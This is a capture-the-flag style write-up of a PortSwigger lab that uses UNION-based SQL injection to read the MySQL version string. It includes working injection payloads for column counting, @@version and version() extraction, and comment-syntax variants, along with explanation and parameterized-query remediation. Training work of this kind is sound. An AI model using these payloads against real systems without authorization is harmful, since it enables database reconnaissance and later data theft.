# SQL Injection Attack, Querying the Database Type and Version on MySQL and Microsoft

**Platform:** PortSwigger Web Security Academy
**Lab URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-query-database-version-mysql-microsoft
**Difficulty:** Apprentice
**Date Completed:** November 1, 2026
**Status:** ✅ Solved

---

## 📋 Lab Description

**Objective:**
This lab has a SQL injection vulnerability in the product category filter. The database is MySQL. The goal is to make the database retrieve its own version string — specifically: `'8.0.42-0ubuntu0.20.04.1'` — and have it reflected in the application's response, using a UNION-based attack.

**Learning Goals:**
- Use `UNION SELECT` to pull data from database metadata (not just application tables)
- Learn MySQL/MSSQL's built-in `@@version` variable for version fingerprinting
- Understand MySQL's comment syntax requirement (`-- ` needs a trailing space)

---

## 🔍 Reconnaissance

**Initial Observation:**
- Same pattern as Labs 1–3: product catalog, category filter via URL parameter
- `?category=Gifts` filters the product list

**Vulnerable Parameter:**
`category` parameter in the URL

**Suspected Vulnerable Query:**
```sql
SELECT * FROM products WHERE category = 'USER_INPUT' AND released = 1
```

**Target string to retrieve:**
```
8.0.42-0ubuntu0.20.04.1
```

---

## 💉 Exploitation

### Step 1: Determine Column Count

Tried `ORDER BY` incrementing. First attempt hit an unexpected issue — see **Troubleshooting** below.

```
category=Gifts'+ORDER+BY+1--+
category=Gifts'+ORDER+BY+2--+
category=Gifts'+ORDER+BY+3--+
```

**Result:**
- `ORDER BY 1` → ✅ normal
- `ORDER BY 2` → ✅ normal
- `ORDER BY 3` → ❌ Internal Server Error

**Conclusion:** Query returns **2 columns**.

### Step 2: Confirm String-Compatible Columns

```
category=Gifts'+UNION+SELECT+'a','a'--+
```

**Result:** ✅ No error — both columns accept string data.

### Step 3: Replace Placeholder with `@@version`

```
category=Gifts'+UNION+SELECT+@@version,NULL--+
```

**Full URL:**
```
https://[lab-id].web-security-academy.net/filter?category=Gifts'+UNION+SELECT+@@version,NULL--+
```

**Modified Query (after injection):**
```sql
SELECT * FROM products WHERE category = 'Gifts' UNION SELECT @@version,NULL-- ' AND released = 1
```

**Result:**
✅ MySQL version string `8.0.42-0ubuntu0.20.04.1` appeared as a product entry on the page
✅ Lab solved successfully!

---

## 🧠 Technical Explanation

### Why `@@version` Works

Unlike Oracle (which requires querying a system view like `v$version` with a mandatory `FROM` clause), **MySQL and Microsoft SQL Server** both expose the database version through a built-in global variable: `@@version`. It can be selected directly, with no `FROM` clause needed:

```sql
SELECT @@version
```

This is one of the clearest differences between database engines when fingerprinting via SQL injection — knowing the backend type (from error messages, behavior, or guessing) tells you exactly which version-retrieval technique to use.

### Why the Comment Syntax Initially Failed

This was the key troubleshooting moment in this lab. The original payload:
```
category=Gifts'+ORDER+BY+1--
```
caused an **immediate Internal Server Error**, even at `ORDER BY 1` — which should never fail since every query has at least 1 column.

**Root cause:** MySQL's `--` comment syntax requires **at least one whitespace character** after the double-dash to be recognized as a valid comment. The payload above ends with `--` directly followed by the closing single-quote from the original query (`' AND released = 1`), with no space in between. MySQL doesn't treat it as a comment, and the result is a genuine syntax error.

**Fix:** Add a trailing space, represented as `+` in a URL-encoded GET request:
```
category=Gifts'+ORDER+BY+1--+
```
This decodes to `Gifts' ORDER BY 1-- ` (note the trailing space) — which MySQL correctly parses as "comment out everything after this point."

**Resulting query:**
```sql
SELECT * FROM products WHERE category = 'Gifts' ORDER BY 1-- ' AND released = 1
```

### Query Breakdown (Final Payload)

```sql
SELECT * FROM products WHERE category = 'Gifts' 
UNION SELECT @@version, NULL-- ' AND released = 1
```

- `category = 'Gifts'` → original filter, still executes
- `UNION SELECT @@version, NULL` → appends a second result set: version string in column 1, `NULL` in column 2 (to match the 2-column requirement)
- `-- ` → comments out the trailing `' AND released = 1`, preventing a syntax error

---

## 🎯 Alternative Payloads Tested

### Payload 1: `#` comment instead of `--` (MySQL-specific, no trailing space needed)
```
category=Gifts'+UNION+SELECT+@@version,NULL%23
```
**Result:** ✅ Works — `#` is a valid MySQL comment that doesn't require a trailing space, avoiding the `--` pitfall entirely

### Payload 2: Version in the second column
```
category=Gifts'+UNION+SELECT+NULL,@@version--+
```
**Result:** ✅ Also works — confirms both columns accept string data

### Payload 3: Using `version()` function instead of `@@version`
```
category=Gifts'+UNION+SELECT+version(),NULL--+
```
**Result:** ✅ Works — `version()` is a MySQL function equivalent to `@@version`

---

## 🚨 Impact Assessment

**Severity:** Medium (standalone) — database fingerprinting is reconnaissance, but it's a critical precursor to targeted, version-specific exploitation (e.g. known CVEs for a specific MySQL build).

**Business Impact:**
- Discloses exact backend technology and patch level
- Enables attackers to look up known vulnerabilities for that specific version
- Signals that the application has at least one live, exploitable SQL injection point

**Technical Impact:**
- Full UNION-based data channel confirmed and working
- Database type and version fingerprinted with certainty (no guessing required)
- Sets up further UNION attacks: table enumeration, credential extraction, etc.

**Attack Complexity:** Low
**Privileges Required:** None (unauthenticated)
**User Interaction:** None

---

## 🛡️ Remediation

### Recommended Fix: Parameterized Queries

Same root cause as every lab in this series — untrusted input is concatenated into SQL syntax instead of being passed as a bound parameter.

**Vulnerable Code (example):**
```python
query = "SELECT * FROM products WHERE category = '" + user_input + "' AND released = 1"
```

**Secure Code:**
```python
cursor.execute(
    "SELECT * FROM products WHERE category = %s AND released = 1",
    (user_input,)
)
```

With parameterization, `@@version`, `UNION SELECT`, and comment sequences are all treated as inert string literals — none of them can alter query structure.

### Additional Security Measures:

1. **Suppress Verbose Errors:**
   - "Internal Server Error" responses should never differ based on SQL syntax validity
   - Generic error pages prevent attackers from using error/no-error as an oracle

2. **Restrict Database Account Privileges:**
   - The application's DB user shouldn't need to read `@@version` or system metadata
   - Principle of least privilege limits reconnaissance value even if injection occurs

3. **Database Version Hardening:**
   - Keep database engines patched — an attacker who fingerprints an outdated version can chain this with known CVEs
   - Don't rely on hiding the version as a security control; fix the injection instead

4. **Web Application Firewall (WAF):**
   - Can flag `UNION SELECT`, `@@version`, `ORDER BY N` probing patterns
   - Defense-in-depth only

---

## 📚 Lessons Learned

1. **Database Fingerprinting Technique Depends on the Engine:**
   - Oracle: `UNION SELECT banner, NULL FROM v$version` (requires `FROM`)
   - MySQL / MSSQL: `UNION SELECT @@version, NULL` (no `FROM` needed)
   - Knowing (or guessing) the backend engine early saves a lot of trial and error

2. **Comment Syntax Is Engine-Specific and Easy to Get Wrong:**
   - MySQL's `--` **requires a trailing space** to be parsed as a comment
   - `#` is a safer MySQL-specific alternative that needs no trailing space
   - A payload that "looks right" can still fail purely on whitespace — always double-check comment termination

3. **An Immediate Error on `ORDER BY 1` Is a Syntax Problem, Not a Column-Count Problem:**
   - Since every query has at least 1 column, `ORDER BY 1` failing points to malformed injection syntax (missing space, wrong quote escaping), not a real column mismatch
   - Useful diagnostic signal when debugging a UNION attack that isn't behaving as expected

4. **`NULL` Padding Still Applies:**
   - Only one column needs to carry the real payload (`@@version`); the rest can stay `NULL` as long as the total count matches

---

## 🔗 References

- **OWASP Top 10 2021:** A03:2021 – Injection
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **PortSwigger SQL Injection — UNION attacks:** https://portswigger.net/web-security/sql-injection/union-attacks
- **PortSwigger SQL Injection Cheat Sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet
- **MySQL Comment Syntax Docs:** https://dev.mysql.com/doc/refman/8.0/en/comments.html

---

## 📸 Screenshots

*(Add screenshots here showing:)*
1. Lab description page (target string highlighted)
2. `ORDER BY 1` initial failure (missing trailing space)
3. `ORDER BY 1--+` corrected — successful response
4. `ORDER BY 2` success, `ORDER BY 3` error → 2 columns confirmed
5. Final `UNION SELECT @@version,NULL--+` payload with version string rendered on page
6. "Lab solved" confirmation

---

## ✅ Completion Checklist

- [x] Understood the lab objective
- [x] Identified vulnerable parameter
- [x] Determined column count via `ORDER BY`
- [x] Diagnosed and fixed MySQL comment-syntax issue (trailing space)
- [x] Confirmed string-compatible column via `UNION SELECT 'a','a'`
- [x] Extracted database version via `UNION SELECT @@version,NULL`
- [x] Documented technical details
- [x] Researched proper remediation
- [x] Completed writeup

---

## 🏷️ Tags

`sql-injection` `union-attack` `database-fingerprinting` `mysql` `mssql` `portswigger` `web-security` `owasp-top-10` `apprentice` `injection`

---

*This writeup is for educational purposes as part of authorized security training on PortSwigger Web Security Academy.*
